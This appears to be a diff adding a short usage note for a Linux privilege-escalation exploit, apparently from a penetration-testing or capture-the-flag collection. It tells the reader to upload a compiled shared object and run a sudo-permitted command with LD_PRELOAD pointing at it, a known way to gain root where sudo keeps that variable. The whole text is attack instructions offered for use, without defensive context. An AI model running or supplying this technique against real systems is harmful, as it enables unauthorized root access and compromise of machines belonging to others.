@@ -1,0 +1,4 @@
+To exploit:
+Upload one of the compiled .so file
+Execute: sudo LD_PRELOAD=pathto/compiled_64bit_ld_preload.so sudo-lcommand
+REPLACE SUDO -L COMMAND WITH AN ACTUAL COMMAND/BINARY & PATHTO TO FULL PATH OF SO FILE
